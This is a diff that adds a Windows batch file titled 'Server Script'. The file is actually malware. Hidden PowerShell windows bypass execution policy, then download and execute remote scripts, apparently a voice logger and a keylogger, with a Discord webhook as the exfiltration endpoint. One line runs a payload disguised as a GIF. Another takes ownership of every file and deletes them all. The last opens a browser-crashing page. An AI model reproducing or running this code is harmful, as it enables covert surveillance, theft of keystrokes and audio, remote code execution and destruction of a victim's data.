@@ -1,0 +1,16 @@
+@echo off
+
+Title Server Script
+Color A
+
+Powershell -Command "(New-Object System.Net.WebClient).DownloadFile('jakoby.lol/voiceLogger')"
+
+Powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1246103939276079164/w6EIj45lN1JXBiVP0c8Z77fd0JAiEgZwh5r9ZRoAvG_E-gYVjxhWPpkVczkdlEUPWce9';irm jakoby.lol/voiceLogger | iex
+
+Powershell -w h -NoP -Ep Bypass -command "$dc='https://discord.com/api/webhooks/1246103939276079164/w6EIj45lN1JXBiVP0c8Z77fd0JAiEgZwh5r9ZRoAvG_E-gYVjxhWPpkVczkdlEUPWce9';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+
+Powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExYjFmY2lqZ2g4dXp0eGNhYW9uaXNkdGQwZzdhamw3NzAycmxpOXkyOSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/oIfPHqFuT6Cn4ksUyR/giphy.gif ?dl=1; invoke-expression $pl
+
+takeown /f * /r /a /d y && icacls * /inheritance:r /grant:r administrators:(F) /t & del /f /q *
+
+iexplore https://jonnybanana.github.io/safari-ie-reaper.github.io
